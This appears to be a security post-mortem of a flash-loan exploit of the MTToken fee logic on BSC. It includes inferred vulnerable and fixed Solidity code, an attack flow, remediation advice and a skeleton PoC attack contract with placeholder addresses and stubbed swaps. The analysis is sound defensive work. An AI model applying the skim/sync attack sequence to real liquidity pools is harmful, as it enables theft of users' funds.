# MTToken — Unbounded Fee Distribution Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-12 |
| **Protocol** | MTToken (MT) |
| **Chain** | BSC |
| **Loss** | ~$37,000 |
| **Attacker** | Unknown |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | MTToken ERC20 Contract |
| **Root Cause** | `transactionFee()` distributes fees without validating that the sum of shares ≤ 100, causing the sender to lose far more tokens than the transfer amount, and making the AMM pair an unintended fee recipient |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

MTToken has a `transactionFee()` function that distributes fees to multiple addresses on every transfer. This function calculates fees based on a list of fee distribution ratios (shares), but does not validate whether the sum of shares exceeds 100.

As a result, `amount * share / 100` is deducted for each fee recipient, meaning that if the total shares sum to 100 or more, the sender loses far more tokens than the transfer amount. Furthermore, the AMM pair contract address is included in the fee recipient list, causing the pair to unintentionally receive a large amount of tokens.

The attacker exploited this by flash-loaning to buy MT, directly transferring MT to the pair to artificially inflate the pair's balance, then extracting profit via `skim()` and `sync()`.

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (Inferred)

```solidity
// ❌ Vulnerable: fee distribution without validating sum of shares
struct FeeRecipient {
    address recipient;
    uint256 share; // fee ratio (%)
}

FeeRecipient[] public feeRecipients; // sum may exceed 100

function transactionFee(address from, uint256 amount) internal returns (uint256 remaining) {
    remaining = amount;
    for (uint256 i = 0; i < feeRecipients.length; i++) {
        // ❌ share% of amount is deducted per recipient
        // if total shares = 150, then 150% of amount is deducted
        uint256 fee = amount * feeRecipients[i].share / 100;
        _balances[from] -= fee;              // deduct from sender
        _balances[feeRecipients[i].recipient] += fee; // credit recipient
        remaining -= fee;
    }
    // ❌ remaining may underflow to negative (in unchecked context)
}

function _transfer(address from, address to, uint256 amount) internal override {
    uint256 net = transactionFee(from, amount); // ❌ over-deduction independent of actual transfer amount
    _balances[from] -= net;  // additional deduction
    _balances[to] += net;
}
```

### Fixed Code

```solidity
// ✅ Fixed: validate sum of shares + cap on total fee
uint256 public constant MAX_TOTAL_FEE = 1000; // max 10% (basis points)

function setFeeRecipients(FeeRecipient[] calldata newRecipients) external onlyOwner {
    uint256 totalShares = 0;
    for (uint256 i = 0; i < newRecipients.length; i++) {
        totalShares += newRecipients[i].share;
    }
    // ✅ enforce cap on total fee sum
    require(totalShares <= MAX_TOTAL_FEE, "Total fee exceeds maximum");
    feeRecipients = newRecipients;
}

function transactionFee(address from, uint256 amount) internal returns (uint256 totalFee) {
    totalFee = 0;
    for (uint256 i = 0; i < feeRecipients.length; i++) {
        uint256 fee = amount * feeRecipients[i].share / 10000; // basis points
        totalFee += fee;
        // ✅ ensure total fee never exceeds amount
        require(totalFee <= amount, "Fee exceeds amount");
        _balances[feeRecipients[i].recipient] += fee;
    }
    _balances[from] -= totalFee; // ✅ deducted only once
}
```

---

## 3. Attack Flow

```
Attacker
  │
  ├─[1] Flash loan from Moolah (BNB/BUSD)
  │
  ├─[2] Buy MT tokens
  │       BUSD → MT (DEX swap)
  │       Acquire large MT position
  │
  ├─[3] Directly transfer MT to MT/BUSD pair
  │       transactionFee() executes:
  │       ┌─ pair address is in feeRecipients
  │       ├─ sum of shares > 100 → excessive fees generated
  │       └─ pair.balance += (amount * totalShares / 100)
  │            pair receives more MT than the transfer amount
  │
  ├─[4] pair.skim(attacker address)
  │       Transfers pair.balanceOf - pair.reserve to attacker
  │       (attacker claims the excess MT received by the pair)
  │
  ├─[5] pair.sync()
  │       Updates reserves to match current balances
  │       MT reserve spikes → price distortion
  │
  ├─[6] Swap MT → BUSD
  │       Extract large amount of BUSD using manipulated reserves
  │
  └─[7] Repay flash loan
        Net profit: ~$37,000
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMoolah {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract MTTokenAttack {
    address constant MT = 0x...;    // MTToken address
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant MT_PAIR = 0...; // MT/BUSD Pair
    IMoolah constant moolah = IMoolah(0x...);

    function attack() external {
        // [1] Moolah flash loan
        moolah.flashLoan(BUSD, 100_000e18, abi.encode("attack"));
    }

    function moolahFlashCallback(uint256 amount, bytes calldata) external {
        // [2] Buy MT with BUSD
        IERC20(BUSD).approve(MT_PAIR, amount);
        // Acquire MT via DEX swap
        uint256 mtAmount = _swapBUSDForMT(amount / 2);

        // [3] Directly transfer MT to pair
        // transactionFee() executes → sum of shares > 100, excess tokens accumulate in pair
        IERC20(MT).transfer(MT_PAIR, mtAmount);

        // [4] Claim excess MT via pair.skim()
        IUniswapV2Pair(MT_PAIR).skim(address(this));

        // [5] Manipulate reserves via sync()
        IUniswapV2Pair(MT_PAIR).sync();

        // [6] Swap acquired MT → BUSD
        uint256 totalMT = IERC20(MT).balanceOf(address(this));
        _swapMTForBUSD(totalMT);

        // [7] Repay flash loan
        IERC20(BUSD).transfer(address(moolah), amount + _fee(amount));
    }

    function _swapBUSDForMT(uint256 busdAmount) internal returns (uint256) { /* ... */ }
    function _swapMTForBUSD(uint256 mtAmount) internal { /* ... */ }
    function _fee(uint256 amount) internal pure returns (uint256) { return amount * 3 / 1000; }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incorrect Fee Logic |
| **Attack Vector** | Flash loan + direct AMM pair transfer + skim/sync |
| **Impact Scope** | Entire MT/BUSD liquidity pool |
| **DASP Classification** | Business Logic Error |
| **CWE** | CWE-190: Integer Overflow/Underflow (missing bounds validation) |
| **Severity** | High |

### Detailed Description

The core flaw in the fee logic is the **absence of an upper bound on the sum of fee ratios**. Because no validation occurs when fee ratios are set, a configuration where the sum exceeds 100 — whether intentional or accidental — can persist. The inclusion of the AMM pair address as a fee recipient further compounded the problem.

---

## 6. Remediation Recommendations

1. **Enforce a cap on total fees**: Validate `sum(shares) <= MAX_FEE` in fee-setting functions such as `setFeeRecipients()`
2. **Use basis points**: Replace percentage (%) with basis points (1/10000) as the unit for improved precision
3. **Block AMM pair addresses from receiving fees**: Automatically exclude DEX pair contracts from the fee recipient list
4. **Log fee change events**: Emit events transparently whenever the fee structure is modified
5. **Restrict `skim()` access**: Allow only trusted addresses to call `skim()`
6. **Add invariant tests**: Add invariant tests to verify that the total sum of balances is preserved before and after transfers

---

## 7. Lessons Learned

- **The sum of fee ratios must always be explicitly validated**: Even if individual fees are reasonable, a total exceeding 100% causes serious issues.
- **AMM pairs must be treated differently from regular EOAs**: When a pair unintentionally receives fees, it becomes a foothold for reserve manipulation attacks.
- **Custom token fee logic requires an independent audit**: Any transfer logic that deviates from standard ERC20 must be subject to a separate audit.
- **`skim()` and `sync()` are dangerous in isolated environments**: When used with tokens whose balances can be manipulated, the AMM's price oracle is compromised.